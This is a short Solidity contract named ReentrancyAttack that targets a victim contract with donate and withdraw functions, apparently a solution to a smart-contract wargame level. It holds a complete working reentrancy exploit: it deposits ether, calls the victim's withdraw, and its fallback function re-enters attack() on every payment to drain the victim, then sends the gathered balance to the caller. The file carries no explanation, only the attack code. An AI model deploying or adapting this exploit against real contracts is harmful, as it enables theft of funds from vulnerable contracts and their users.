// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ReentrancyAttack {
  address payable victim;

  constructor(address payable _victim) public payable {
    victim = _victim;
  }

  function donate() public payable {
    bytes memory payload = abi.encodeWithSignature(
      "donate(address)",
      address(this)
    );
    victim.call{value: msg.value}(payload);
  }

  function attack() public payable {
    bytes memory payload = abi.encodeWithSignature(
      "withdraw(uint256)",
      0.1 ether
    );
    victim.call(payload);
  }

  fallback() external payable {
    attack();
  }

  function withdraw() public {
    msg.sender.transfer(address(this).balance);
  }

}